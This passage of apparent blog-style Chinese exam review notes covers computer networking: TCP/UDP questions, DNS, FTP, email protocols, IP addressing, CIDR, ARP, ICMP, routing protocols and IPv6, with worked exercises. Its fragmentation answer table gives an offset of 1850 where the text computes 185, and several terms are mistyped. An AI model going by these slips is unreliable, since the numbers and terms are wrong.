</li>
<li><p><code>若收到的报文段无差错，只是未按序号，中间还缺少一些序号的数据，那么能否设法只传送缺少的数据而不重传已经正确到达接收方的数据？</code></p>
<p>答：选择确认SACK就是一种可行的处理方法。</p>
</li>
<li><p><code>tcp在进行拥塞控制时是以分组的丢失作为产生拥塞的标志，有没有不是因为拥塞而引起的分组丢失的情况？举例</code></p>
<p>答：有。一是信道误码导致中间结点将分组丢弃；二是路由错误导致分组在网络中兜圈子最后被路由器丢弃；三是中间路由器在接收了分组还没有转发出去时故障，导致分组丢失。这些情况发生的概率都比较小。</p>
</li>
<li><p><code>为什么在TCP首部中有一个首部长度字段，而UDP的首部中就没有这个字段？</code></p>
<p>答：TCP首部除固定长度部分外，还有选项，因此TCP首部长度是可变的。UDP首部长度是固定的</p>
</li>
</ol>
<p><strong><font color=orang size=4>习题：</strong></font></p>
<hr>
<ol>
<li><p><code>运输层在协议栈中的地位和作用。运输层的通信和网络的通信有什么重要的区别？为什么运输层是必不可少的？</code></p>
<p>答：运输层处于面向通信部分的最高层，同时也是用户功能中的最底层，向它上面的应用层提供服务。</p>
<p>运输层为应用进程之间提供端到端的逻辑通信，但网络层是为主机之间提供逻辑通信（面向主机，承担路由功能，即主机寻址及有效的分组交换）。</p>
<p>各种应用进程之间通信需要“可靠或尽力而为”的两类服务质量，必须由运输层以复用和分用的形式加载到网络层。</p>
</li>
<li><p><code>一个UDP用户数据报的数据字段为8192字节。在链路层要使用以太网来传送，试问应当划分为几个IP数据报片？说明每一个IP数据报片的数据字段长度和偏移字段的值</code></p>
<p> 答：<center><img width=600 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210101205310.png"></center></p>
</li>
<li><p><code>主机A和B使用TCP通信。在B发送过的报文段中，有这样两个先后到达的报文段：ACK=120和ACK=100，即前一个报文段的确认序号大于后一个。请解释原因。</code></p>
<p>答：ACK=120 的报文 比 ACK=100的先到。<br>虽然ACK=100 是先发出来的，但是路径开销比ACK=120 的报文要大。<br>就好像两辆车从A地出发到B低去，A车先走，B车其次。A车走国道，B车走高速。所以B先到了。</p>
</li>
<li><p><code>设TCP的ssthresh的初始值为8.当拥塞窗口上升到12时网络发生了超时，TCP使用慢开始和拥塞避免，试分别求出第1~15次传输的各拥塞窗口大小</code></p>
<p>答：1、2、4、8、9、10、11、12、1、2、4、6、7、8、9</p>
</li>
<li><p><code>一个UDP用户数据报的首部的十六进制表示是06 32 00 45 00 1C E2 17。求源端口、目的端口、用户数据报总长度、数据部分长度。</code></p>
<p>解：<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102114758.png"></center></p>
</li>
<li><p><code>主机A向主机B发送一个很长的文件，其长度为L字节。假定TCP使用的MSS有1460字节。在TCP的序号不重复使用的条件下，L的最大值是多少？假定使用上面计算出文件长度，而运输层、网络层和数据链路层所使用的首部开销共66字节，链路的数据率为10Mb/s，试求这个文件所需的最短发送时间。</code></p>
<p>解：<br>(1) L_max的最大值是2^32=4GB,G=2^30.<br>(2) 满载分片数Q={L_max/MSS}取整=2941758，发送的总报文数N=Q*(MSS+66)+{(L_max-Q*MSS)+66}=4489122708+682=4489123390字节，发送字节需时间为：N*8/（10*10^6）=3591.3秒，即59.85分，约1小时。</p>
<p>计算总报文数的另一种方法：L_max + (Q+1)*66</p>
</li>
<li><p><code>通信信道带宽为1Gbit/s，端到端时延为10ms。TCP的发送窗口为65535字节。试问： 可能达到的最大吞吐量是多少？信道的利用率是多少？</code></p>
<p>解：发送时延 = 数据长度 / 信道带宽，信道利用率 = 最大吞吐量 / 信道带宽 </p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102122347.png"></center></li>
</ol>
<h2 id="第六章-应用层"><a href="#第六章-应用层" class="headerlink" title="第六章 应用层"></a>第六章 应用层</h2><center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102124034.png"></center>

<p><font color=red>一、 DNS的基本概念、作用及解析过程</font></p>
<p>域名：因特网上主机的名字，体现其逻辑位置</p>
<p>特点：与IP地址对应，更容易记忆。</p>
<p>作用：域名系统DNS是因特网使用的命名系统，用来把便于人们使用的域名转换为IP地址。</p>
<p>域名的解析过程：</p>
<ul>
<li>主机向本地域名服务器的查询一般都是采用递归查询</li>
<li>本地域名服务器向根域名服务器的查询通常采用迭代查询<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102125932.png"></center></li>
</ul>
<p><font color=red>二、 FTP的基本概念及两个连接机制</font></p>
<p>文件传送协议FTP是互联网上使用得最广泛的文件传送协议。FTP提供交互式的访问，允许客户指明文件的类型与格式，并允许文件具有存取权限。FTP屏蔽了各计算机系统的细节，因而适合于在异构网络中任意计算机之间传送文件。</p>
<p>FTP特点：</p>
<ul>
<li>只提供文件传送的一些基本的服务，它使用TCP可靠的运输服务</li>
<li>主要功能是减少或消除在不同操作系统下处理文件的不兼容性</li>
<li>使用客户服务器方式。FTP的服务器进程由两部分组成：一个主进程，负责接收新的请求；另外有若干个从属进程，负责处理单个请求。</li>
</ul>
<p>两个连接：</p>
<ul>
<li>控制连接在整个会话期间一直保持打开，FTP客户发出的传送请求通过控制连接发送给服务器端的控制进程，但控制连接不用来传送文件</li>
<li>实际用于传输文件的是“数据连接”。服务器端的控制进程在接收到FTP客户发送来的文件传输请求后就创建“数据传送进程”和“数据连接”，用来连接客户端和服务器端的数据传送进程。数据传送进程实际完成文件的传送，在传送完毕后关闭“数据传送连接”并结束运行。</li>
</ul>
<p>使用两个不同端口号(建立连接请求端口：21、传送数据端口：20)的好处：</p>
<ul>
<li>使协议更加简单和更容易实现</li>
<li>在传输文件时还可以利用控制连接<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102132002.png"></center></li>
</ul>
<p><font color=red>三、 万维网的基本概念，URL的格式</font></p>
<p>万维网是一个大规模的、联机式的信息储藏所。万维网用链接的方法能非常方便地从互联网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息，这种访问方式称为“链接”</p>
<p>统一资源定位符URL：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是对可以从因特网上得到的资源的位置和访问方法的一种简洁的表示。URL给资源的位置提供一种抽象的识别方法，并用这种方法给资源定位。</p>
<p>URL的一般形式是：</p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102145732.png"></center>



<p><font color=red>四、 电子邮件系统构成、协议，SMTP通信的三个阶段</font></p>
<p>电子邮件系统由三部分构成：用户代理、邮件服务器以及邮件发送协议和邮件读取协议。</p>
<p>电子邮件构成：信封和内容</p>
<p><strong><center><font size=4 color=blue>协议</font></center></strong></p>
<ol>
<li><p>简单邮件发送协议SMTP：</p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102143403.png"></center></li>
<li><p>邮件读取协议POP3:</p>
<ul>
<li>邮局协议POP是一个非常简单但是功能有限的邮件都区协议，现在使用的是它的第三个版本POP3。</li>
<li>POP也使用客户-服务器的工作方式</li>
<li>在接收邮件的用户pc机中必须运行POP客户程序，而在用户所连接的ISP的邮件服务器中则运行POP服务器程序</li>
</ul>
</li>
<li><p>邮件读取协议IMAP:</p>
<ul>
<li>IMAP也是按客户服务器方式工作，现在较新的是版本4</li>
<li>用户在自己的pc机上就可以操纵ISP的邮件服务器的邮箱，就像在本地操纵一样</li>
<li>IMSP是一个联机协议。当用户pc机上的IMAP客户程序打开IMAP服务器的邮箱时，用户就可看到邮件的首部。若用户需要打开某个邮件，则该邮件才传到用户的计算机上。</li>
</ul>
</li>
</ol>
<p>SMTP通信三个阶段：</p>
<ol>
<li>连接建立：连接实在发送主机的SMTP客户和接收主机的SMTP服务器之间建立的。SMTP不使用中间的邮件服务器</li>
<li>邮件传送</li>
<li>连接释放：邮件发送完毕后，SMTP应释放TCP连接</li>
</ol>
<p><strong><font color=orang size=4>探研：</strong></font></p>
<hr>
<ol>
<li><p><code>设想有一天整个因特网的DNS系统都瘫痪了，试问还有可能给朋友发送电子邮件吗？</code></p>
<p>答：能。</p>
</li>
<li><p><code>域名系统的主要功能是什么？域名系统中的本地域名服务器、根域名服务器、顶级域名服务器以及权限名服务器有何区别？</code></p>
<p>答：域名系统DNS是因特网使用的命名系统，用来把便于人们使用的机器名字（域名）转换为IP地址</p>
<ul>
<li>本地域名服务器离用户较近，一般不超过几个路由器的距离。当一个主机发出DNS查询请求时，这个查询请求报文就发送给本地域名服务器。当所要查询的主机也属于同一个本地ISP时，该本地域名服务器立即就能将所查询的主机名转换为它的IP地址，而不需要再去询问其他的域名服务器。</li>
<li>根域名服务器是最高层次的域名服务器，也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和IP地址。不管是哪一个本地域名服务器，若要对因特网上任何一个域名进行解析，只要自己无法解析，就首先求助于根域名服务器。</li>
<li>顶级域名服务器负责管理在该顶级域名服务器注册的所有二级域名。当收到DNS查询请求时，就给出相应的回答（可能是最后的结果，也可能是下一步应当找的域名服务器的IP地址）。</li>
<li>权限域名服务器是负责一个区的域名服务器，用来保存该区中的所有主机的域名到IP地址的映射。当一个权限域名服务器还不能给出最后的查询回答时，就会告诉发出查询请求的DNS客户，下一步应当找哪一个权限域名服务器。</li>
</ul>
</li>
<li><p><code>基于万维网的电子邮件系统有什么特点？在传送邮件时使用什么协议？</code></p>
<p>答：特点：不管在什么地方，只要能上网，在打开万维网浏览器后，就可以收发电子邮件。这时，邮件系统中的用户代理就是普通的万维网。电子邮件从A发送到网易邮件服务器是使用HTTP协议。两个邮件服务器之间的传送使用SMTP。邮件从新浪邮件服务器传送到B使用HTTP协议。</p>
</li>
<li><p><code>DHCP 协议用在什么情况下？当一台计算机第一次运行引导程序时，其 ROM 中有没有该主机的 IP 地址、子网掩码或某个域名服务器的 IP 地址？</code></p>
<p>答：动态主机配置协议DHCP提供了即插即用连网的机制。这种机制允许一台计算机加入新的网络和获取IP地址而不用手工参与。ROM中当然不可能有IP相关的信息。</p>
</li>
<li><p><code>为什么有的应用层协议要使用TCP而有的却要使用UDP？</code></p>
<p>答：正确答案：应用层协议根据各自功能的需求，有的需要使用面向连接的TCP服务，提供可靠的数据传输服务，如FTP，HTTP等；有的协议使用无连接的UDP服务，提供比较灵活的服务，如DHCP，SNMP等。</p>
</li>
<li><p><code>为什么MIME花在SMTP上面？</code></p>
<p>答：MIME协议是扩展了的SMP协议，是基于SMTP的，所以要放在SMTP上面画。</p>
</li>
<li><p><code>为什么路由选择协议RIP放在应用层？</code></p>
<p>答：由于RIP协议是基于UDP协议而创建的，所以RIP协议应放在UDP协议的上一层。</p>
</li>
</ol>
<p><strong><font color=orang size=4>习题：</strong></font></p>
<hr>
<ol>
<li><p><code>如果本地域名服务器无缓存，当采用递归方法解析另一个网络某主机域名时，用户主机和本地域名服务器发送的域名请求条数分别为 1条、1条</code></p>
<p>解析：当采用递归查询的方法解析域名时，如果主机所询问的本地域名服务器不知道被查询域名的IP地址，那么本地域名服务器就以DNS客户的身份，向其他根域名服务器继续发出查询请求报文，这种方法中用户主机和本地域名服务器发送的域名请求条数均为1条。</p>
</li>
<li><p><code>当使用鼠标点击一个万维网文档时，若该文档除了有文本外，还有一个本地.gif图像和两个远地.gif图像。试问；需要使用那个应用程序，以及需要建立几次UDP连接和几次TCP连接？</code></p>
<p>答：若使用HTTP/1.0，需要建立0次UDP连接，4次TCP连接；若使用HTTP/1.1，需要建立0次UDP连接，1次TCP连接。</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>计算机网络（期末复习第4章）</title>
    <url>/2020/12/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E7%AC%AC4%E7%AB%A0%EF%BC%89/</url>
    <content><![CDATA[<center><img width="400"  src="https://img-blog.csdnimg.cn/20201228164622206.png"></center>

<span id="more"></span>

<p><font color="red">一、网络层提供的两种服务方式及特点（面向连接服务和无连接服务）</font></p>
<p>网络负责可靠交付：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模仿电信网络，使用面向连接的通信方式。</p>
<ul>
<li>通信之前先建立虚电路，以保证双方通信所需的一切网络资源</li>
<li>再使用可靠传输的网络协议，使所发送的分组无差错、按序到达终点，不丢失、不重复</li>
</ul>
<p>网络提供数据报服务：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务</p>
<ul>
<li>网络在发送分组时不需要先建立连接。</li>
<li>网络层不提供服务质量的承诺。</li>
</ul>
<p>虚电路服务与数据报服务的对比：</p>
<center><img width="600" src="https://img-blog.csdnimg.cn/20201228183029868.png"></center>

<p><font color="red">二、网络互连的概念、设备、层次、协议</font></p>
<p>网络互连是指将不同的网络连接起来，以构成更大规模的网络系统，实现网络间的数据通信、资源共享和协同工作。网络互连都是只用路由器进行网络互连和路由选择。</p>
<p>与IP协议配套使用的还有三个协议：</p>
<ul>
<li>地址解析协议ARP</li>
<li>网际控制报文协议ICMP</li>
<li>网际组管理协议IGMP</li>
</ul>
<p>有以下五种不同的中间设备：</p>
<ul>
<li>物理层中继系统：转发器</li>
<li>数据链路层中继系统：网桥或桥接器</li>
<li>网络层中继系统：路由器</li>
<li>网桥和路由器的混合物：桥路器</li>
<li>网络层以上的中继系统：网关</li>
</ul>
<p>使用IP协议的虚拟互联网络可以简称为IP网，互联网就是一个虚拟互联网络。</p>
<p><font color="red">三、IP值的组成、分类</font></p>
<p>IP地址就是给每个连接在互联网上的主机（或路由器）分配一个在全世界范围内唯一的32位标识符。</p>
<p>IP地址现在由互联网名字和数字分配机构进行分配。</p>
<p>IP地址的编址方法：</p>
<ul>
<li>分类的IP地址</li>
<li>子网的划分</li>
<li>构成超网</li>
</ul>
<center><font color=lighblue size=5 face="华文楷体">分类IP地址</font></center>

<ul>
<li>将IP地址划分为若干个固定类</li>
<li>每一类地址都由两个固定长度的字段组成，其中一个字段是网络号net-id，它标志主机（或路由器）所连接到的网络，而另一个字段则是主机号host-id，它标志该主机（或路由器）</li>
<li>主机号在它前面的网络号所指明的网络范围内必须是唯一的<br>一个IP地址在整个互联网范围内是唯一的。</li>
<li>两级的IP地址结构：网络号+主机号（32位）</li>
<li>两级的IP地址记为：IP地址::={&lt;网络号&gt;,&lt;主机号&gt;}，符号“::”=代表“定义为”</li>
</ul>
<p><strong><center>各类IP地址的网络号字段和主机号字段</center></strong></p>
<center><img width="600" src="https://img-blog.csdnimg.cn/20201228205138384.png"></center>

<center><img width="600" src="https://img-blog.csdnimg.cn/20201228211049516.png"></center>

<p><font color="red">四、子网的划分（子网数、主机数、子网号、子网掩码等）和CIDR的基本概念及应用</font></p>
<p>三级IP地址记为：IP地址::={&lt;网络号&gt;,&lt;子网号&gt;,&lt;主机号&gt;}。划分子网只是把IP地址的主机号host-id这部分进行再划分，而不改变IP地址原来的网络号net-id.</p>
<center><img width="400" src="https://img-blog.csdnimg.cn/20201229193335973.png"></center>

<p>三级结构的好处：</p>
<ul>
<li>减少IP地址的浪费</li>
<li>使网络的组织更加灵活</li>
<li>更便于维护和管理</li>
</ul>
<p><font color="#b4d">子网掩码</font></p>
<p>使用子网掩码可以找到IP地址中的子网部分。<br>子网掩码长度 = 32位；<br>某位 = 1：IP地址中的对应位为网络号和子网号<br>某位 = 0：IP地址中的对应位为主机号</p>
<p>IP地址的各字段和子网掩码：</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201229194136232.png"></center>


<table>
<thead>
<tr>
<th>地址分类</th>
<th>默认子网掩码</th>
</tr>
</thead>
<tbody><tr>
<td>A类地址</td>
<td>255.0.0.0</td>
</tr>
<tr>
<td>B类地址</td>
<td>255.255.0.0</td>
</tr>
<tr>
<td>C类地址</td>
<td>255.255.255.0</td>
</tr>
</tbody></table>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201229201533992.png"></center>

<p><font color="#b4d">无分类编址CIDR</font></p>
<p>CIDR消除了传统的A类、B类和C类地址以划分子网的概念，使用各种长度的“网络前缀”来代替分类地址中的网络号和子网号。</p>
<p>无分类的两级编址的记法为：</p>
<center><img width="400" src="https://img-blog.csdnimg.cn/20201229203000787.png"></center>

<p>CIDR把网络前缀都相同的连续的IP地址组成“CIDR地址块”。全0和全1的主机号地址一般不使用。</p>
<p><font color="#b4d">路由聚合</font></p>
<ul>
<li>一个CIDR地址块可以表示很多地址，这种地址的聚合常称为路由聚合。</li>
<li>路由聚合有利于减少路由器之间的路由选择信息的交换，从而提高了整个互联网的性能</li>
<li>路由聚合也称为构成超网。</li>
<li>对于/20地址块，它的掩码是20个连续的1.斜线记法中的数字就是掩码中1的个数。</li>
</ul>
<p><strong>CIDR记法的其他形式</strong></p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201229204454677.png"></center>

<p>CIDR地址块中的地址数一定时2的整数次幂。</p>
<p>CIDR好处：更加有效地分配IPv4的地址空间，可根据客户的需要分配适当大小的CIDR地址块。</p>
<p>最长前缀匹配：</p>
<ul>
<li>在查找路由表时可能会得到不止一次匹配结果</li>
<li>应当从匹配结果中选择具有最长网络前缀的路由：最长前缀匹配</li>
<li>网络前缀越长，其地址块就越小 ，因而路由就越具体</li>
<li>最长前缀匹配又称为最长匹配或最佳匹配</li>
</ul>
<p><font color="red">五、IP数据报格式，各字段的含义及作用</font></p>
<p><font color="#b4d">IP数据报的格式</font></p>
<ul>
<li>一个IP数据报由首部和数据两部分组成</li>
<li>首部的前一部分是固定长度，共20字节，是所有IP数据报必须具有的。</li>
<li>在首部的固定部分的后面是一些可选字段，其长度是可变的。</li>
</ul>
<center><img width="600" src="https://img-blog.csdnimg.cn/20201228214031824.png"></center>

<ul>
<li>版本——占4位，指IP协议的版本（即IPv4）</li>
<li>首部长度——占4位，因此IP的首部长度的最大值是60字节。</li>
<li>总长度——占16位，指首部和数据之和的长度，单位为字节。总长度必须不超过最大传送单位MTU</li>
<li>标识——占16位，是一个计数器，用来产生IP数据报的表识</li>
<li>标志——占3位，只有前两位有意义。最低位MF:MF=1（还有分片）、MF=0（最后一个分片）；中间位DF，只有当DF=0时才允许分片</li>
<li>片偏移——占13位，片偏移以8给字节为偏移单位</li>
<li>生存时间——占8位，记为TTL，指示数据报在网络中可通过的路由器的最大值</li>
<li>协议——占8位，指出此数据报携带的数据为何种协议，以确定目的主机的IP层需要将数据部分上交给哪个协议进程</li>
<li> 首部检验和——占16位，只检验数据报的首部，不检验数据部分。采用校验和计算方法。（采用16位二进制反码求和算法）</li>
<li>源地址和目的地之各占4个字节</li>
</ul>
<p><font color="red">六、ARP协议的基本概念和应用，IP地址和MAC地址的区别</font></p>
<p><font color="#b4d">地址解析协议ARP:</font></p>
<p>通信时使用了两个地址：</p>
<ul>
<li>IP地址（网络层地址）</li>
<li>MAC地址（数据链路层地址）</li>
</ul>
<p>ARP协议的作用：<br>解决同一个局域网上的主机或路由器的IP地址和硬件地址的映射问题。</p>
<p>使用ARP的四种典型情况：</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/2020122821285710.png"></center>


<p>IP地址和MAC地址的区别:</p>
<ol>
<li>硬件地址是数据链路层和物理层使用的地址，是一种物理地址；IP地址是网络层和以上各层使用的地址，是一种逻辑地址。（IP地址是用软件实现的）。</li>
<li>MAC地址具有唯一性；IP地址不具有唯一性</li>
<li>MAC地址是Ethernet网卡上带的地址，长度为48位；IP地址目前主流是32位长。</li>
<li>IP地址放在IP数据报的首部，而硬件地址则放在MAC帧的首部。</li>
</ol>
<p><font color="red">七、ICMP报文类型、作用</font></p>
<p>ICMP是互联网的标准协议，ICMP允许主机或路由博鳌公安差错情况和提供有关异常情况的报告。ICMP不是高层协议，而是IP层的协议。</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201229214556303.png"></center>

<p>ICMP报文有三类：差错报文；控制报文；询问报文</p>
<ul>
<li>PING 用来测试两个主机之前的连通性</li>
<li>Traceroute 用来跟踪一个分组从源点到终点的路径</li>
<li>MTU 利用IP数据报标志字段的中间位DF</li>
</ul>
<p><font color="red">八、ICMP的作用</font></p>
<p>为了更有效的转发IP数据报和提高交付成功的机会，在网际层使用了网际控制报文协议ICMP。</p>
<p>ICMP协议是TCP/IP协议的一个子协议。用在IP主机、路由器之间传递控制消息，控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。即提供差错报告和询问报文。</p>
<p><font color="red">九、路由器的构成、路由器转发分组的流程，路由表的构建</font></p>
<p>路由器是一种具有多个输入端口和多个输出端口的专用计算机，其任务是转发分组。</p>
<p>路由器结构可划分为两大部分：</p>
<ul>
<li>路由选择部分</li>
<li>分组转发部分</li>
</ul>
<p>在路由表中，对每一条路由，最主要的是（目的网络地址，下一跳地址）</p>
<p>根据目的网络地址就能确定下一跳路由器</p>
<p>路由器还可以采用默认路由以减少路由表所占的空间和搜索路由表所用的时间</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201229192419166.png"></center>

<p><font color="#b4d">路由器分组转发算法</font></p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201229192434674.png"></center>

<p><font color="#b4d">在划分子网的情况下路由器转发分组的算法</font></p>
<center><img width="500" src="https://img-blog.csdnimg.cn/2020122919505359.png"></center>

<p><font color="#b4d">关于路由表</font></p>
<p>路由表没有给分组指明到某个网络的完整路径。路由表指出，到某个网络应当先到某个路由器（下一跳路由器）。在到达下一跳路由器后，再继续查找其路由表，知道下一步应该到达哪一个路由表。这样一步步查找下去，直到最后到达目的网络。</p>
<p><font color="red">十、路由协议的分类，路由算法的含义和应用</font></p>
<center><img width="400" src="https://img-blog.csdnimg.cn/20201230232911739.png"></center>

<ul>
<li>内部网关协议IGP，如RIP、OSPF</li>
<li>网布网关协议EGP，如BGP-4</li>
</ul>
<center><font color="sapphire" size=5 face="黑体">RIP</font></center>

<p>RIP是一种分布式、基于距离向量的路由选择协议。RIP协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录。</p>
<p>RIP允许一条路径最多只能包含15个路由器。“距离”的最大值为16时即相当于不可达。RIP不能在两个网络之间同时使用多条路由。</p>
<p>“距离”的定义：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从一个路由器到直接连接的网络的距离定义为1，从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加1.</p>
<p><font color="#b4d">距离向量算法</font></p>
<center><img width=600 src="https://img-blog.csdnimg.cn/20201230234312998.png"></center>

<p>例题：</p>
<center><img width=600 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20201231165705.png"></center>

<p>一个RIP报文最多可包括25个路由，因而RIP报文的最大长度是4+20x25=504字节，如果超过，必须再用一个RIP报文来传送。</p>
<p>RIP协议特点：好消息传播得快，坏消息传播得慢。</p>
<center><font color="sapphire" size=5 face="黑体">OSPF</font></center>

<p>“最短路径优先”是因为使用了Dijkstra提出的最短路径算法，采用分布式的链路状态协议。</p>
<p>向本自治系统中所有的路由器发送信息，这里使用的方法是洪泛法。</p>
<p>划分区域的好处就是将洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自制系统，这就减少了整个网络上的通信量。OSPF使用层次结构的区域划分，在上层的区域叫做主干区域。</p>
<p>OSPF不用UDP而是直接用IP数据报传送。支持可变长度的子网划分和无分类编址CIDR。</p>
<center><font color="sapphire" size=5 face="黑体">BGP</font></center>

<p>边界网关协议BGP是能是力求寻找一条能够到达目的网络且比较好的路由，而并非要寻找一条最佳路由。</p>
<p>每个自治系统的管理员要选择至少一个路由器作为该自治系统的“BGP发言人”。</p>
<p>使用TCP连接交换路由信息的两个BGP发言人，彼此称为对方的邻站或对等站。</p>
<p>BGP支持CIDR，共使用四种报文：打开报文、更新报文、保活报文、通知报文。</p>
<p><font color="#b4d">三种路由选择协议比较</font></p>
<center><img width=500 src="https://img-blog.csdnimg.cn/20201231162731864.png"></center>




<p><font color="red">十一、IPv6地址格式</font></p>
<p>IPv6仍然支持无连接的传送，但将协议数据单元PDU称为分组。</p>
<p>所引进的主要变化是：</p>
<ul>
<li>更大的地址空间</li>
<li>扩展的地址层次结构</li>
<li>灵活的首部格式</li>
<li>改进的选项</li>
<li>允许协议继续扩充</li>
<li>支持即插即用</li>
<li>支持资源的预分配</li>
<li>IPv6首部改为8字节对齐</li>
</ul>
<p>IPv6两大组成部分：基本首部和有效载荷</p>
<p>IPv6将首部长度变为固定的40字节，称为基本首部。更改如下：</p>
<center><img width=600 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20201231163412.png"></center>

<center><img width=600 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20201231163450.png"></center>

<ul>
<li>通信量类：区分不用数据报的类别或优先级</li>
<li>流标号：所有属于同一个流的数据报都具有相同的流标号</li>
<li>有效载荷长度：指明数据报初级本首部以外的字节数，其最大值为64KB</li>
<li>下一个首部：相当于IPv4的协议字段或可选字段</li>
<li>跳数限制：路由器在转发数据报时将条数限制字段中的值减1。当跳数限制的值为零时，就要将此数据报丢弃。</li>
</ul>
<p>IPv6数据报的目的地址基本分类：</p>
<ul>
<li>单播</li>
<li>多播</li>
<li>任播：目的站是一组计算机，但是数据报在交付时只交付其中的一个，通常是最近的一个。</li>
</ul>
<p>冒号十六进制记法：</p>
<ol>
<li>允许把数字前面的0省略</li>
<li>允许零压缩，即一连串连续的零可以为一对冒号所取代，在任一地址中只能使用一次零压缩</li>
</ol>
<p>IPv6地址分类：</p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20201231165114.png"></center>

<p><strong>探研题：</strong></p>
<hr>
<ol>
<li><p><code>wireshark如何捕获广播帧？</code></p>
<p> 答：<center><img width=400 src="https://img-blog.csdnimg.cn/20201228211217956.png"></center></p>
</li>
<li><p><code>为什么不直接使用硬件地址进行通信？</code></p>
<p> 答：一方面，全世界存在着各种不同的网络，使用不用的硬件地址。要使这些异构网络能够互相通信就必须进行非常复杂的硬件地址转换工作，几乎不可能实现；<br> 另一方面，IP编址把这个负责问题解决了。连接到互联网的主机只需要各自拥有一个唯一的IP地址，他们之间的通信就像连接在同一个网络上那样简单方便。<br> 因此，在虚拟的IP网络上用IP地址进行通信给广大的计算机用户带来了很大的方便。</p>
</li>
<li><p><code>为什么ARP高速缓存每存入一个项目就要设置10~20分钟的超时计时器。时间设置太大或太小会出现什么问题?</code></p>
<p> 答：考虑到IP地址和Mac地址有可能是变化的（更换网卡或动态主机配置），10~20分钟更换一块网卡是合理的。超时时间田铎会使ARP请求和响应分组的通信量太频繁；超时时间太长会使更换网卡后的主机迟迟无法和网络上的其他主机通信。</p>
</li>
<li><p><code>至少举出两种不需要发送ARP请求分组的情况（不需要请求将某个目的IP地址解析为相应的硬件地址）</code></p>
<p> 答：在源主机的ARP高速缓存中已经有了该目的IP地址的项目；源主机发送的是广播分组；源主机和目的主机使用点对点链路。</p>
</li>
<li><p><code>为什么不能说ARP（向网络层提供了转换地址的服务）应当属于数据链路层？</code></p>
<p> 答：因为ARP本身是网络层的一部分，ARP协议为IP协议提供了转换地址的服务，数据链路层使用硬件地址而不使用IP地址，无需ARP协议数据链路层本身即可正常运行。</p>
</li>
<li><p><code>IP数据报的总长度最多能够达到多少？</code></p>
<p> 答：因为IP数据报报文总长度字段为16位，因此数据报的最大长度为2^16-1=65535字节。</p>
</li>
</ol>
<p><strong>例题：</strong></p>
<hr>
<ol>
<li><p><code>一个3200bit长的tcp报文传到IP层，加上160bit的首部后成为数据表。互联网由两个局域网通过路由器连接起来但第二个局域网所能传送的最长帧中的数据部分只有1200bit 因此数据报在路由器上必须进行分片。试问第二个局域网要向上层要传送多少bit数据。</code></p>
<p> 答：分片分别要加首部，每个数据报片数据部分≤1200-160＝1040bit,但是片偏移以8字节(64bit)为单位，这就要求ip数据分片的长度是64bit的整数倍，所以分片长度不超过1024bit,3200/1024＝3.125,所以分四个分片。总的上传的数据=3200+160×4=3840bit</p>
</li>
<li><p><code>一个数据报长度为4000字节(固定首部长度,长度为20字节).现在经过一个网络传送,网络能传送的最大数据长度为1500字节.试问应当划分成几个短些的数据报片?各数据报片的数据字段长度,片偏移字段和MF标志应为何值.</code></p>
<p> 答：数据报长度为4000字节，其中包含20字节固定首部长度，故数据部分为3980字节。<br> 最大数据长度为1500字节，其中包括IP数据报固定长度为20字节，因此前两个分片数据字段长度为1520-20=1480字节。<br> 最后一个分片长度为3980-2*1480=1020字节。<br> 片偏移分别为0/8=0；1480/8=185；2960/8=370</p>
<table>
<thead>
<tr>
<th></th>
<th>数据报长度（字节）</th>
<th>片偏移</th>
<th>MF</th>
</tr>
</thead>
<tbody><tr>
<td>数据报片1</td>
<td>1480</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>数据报片2</td>
<td>1480</td>
<td>1850</td>
<td>1</td>
</tr>
<tr>
<td>数据报片3</td>
<td>1020</td>
<td>370</td>
<td>0</td>
</tr>
</tbody></table>
</li>
<li><p> <code>已知路由器Rl的路由表如4-28表所示。试画出各网络和必要的路由器的连接拓扑，标注出必要的IP地址和接口，对不能确定的情况应当指明。</code></p>
</li>
</ol>
   <center><img width=400 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20201231182452.png"></center>
    <center><img width=400 src="https://img-blog.csdnimg.cn/20201231182913262.png"></center>

<ol start="4">
